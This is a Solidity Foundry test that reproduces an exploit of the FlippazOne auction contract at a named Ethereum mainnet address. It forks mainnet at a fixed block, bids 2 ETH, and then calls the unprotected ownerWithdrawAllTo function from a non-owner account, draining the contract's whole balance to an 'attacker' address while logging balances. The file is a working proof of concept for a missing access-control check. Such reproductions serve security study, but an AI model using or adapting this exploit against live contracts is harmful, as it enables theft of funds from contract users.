// SPDX-License-Identifier: UNLICENSED

pragma solidity >=0.7.0 <0.9.0;

import "forge-std/Test.sol";

interface Flippaz {
    function bid() external payable;

    function ownerWithdrawAllTo(address toAddress) external;
}

contract ContractTest is Test {
    Flippaz FlippazOne = Flippaz(0xE85A08Cf316F695eBE7c13736C8Cc38a7Cc3e944);

    function setUp() public {
        vm.createSelectFork("mainnet", 15_083_765); // fork mainnet at block 15083765
    }

    function testExploit() public {
        address alice = vm.addr(1);
        emit log_named_uint(
            "Before exploiting, ETH balance of FlippazOne Contract:",
            address(FlippazOne).balance
        );
        vm.prank(msg.sender);
        FlippazOne.bid{value: 2 ether}();
        emit log_named_uint(
            "After bidding, ETH balance of FlippazOne Contract:",
            address(FlippazOne).balance
        );

        //Attacker try to call ownerWithdrawAllTo() to drain all ETH from FlippazOne contract
        FlippazOne.ownerWithdrawAllTo(address(alice));
        emit log_named_uint(
            "After exploiting, ETH balance of FlippazOne Contract:",
            address(FlippazOne).balance
        );
        emit log_named_uint(
            "ETH balance of attacker Alice:",
            address(alice).balance
        );
    }
}
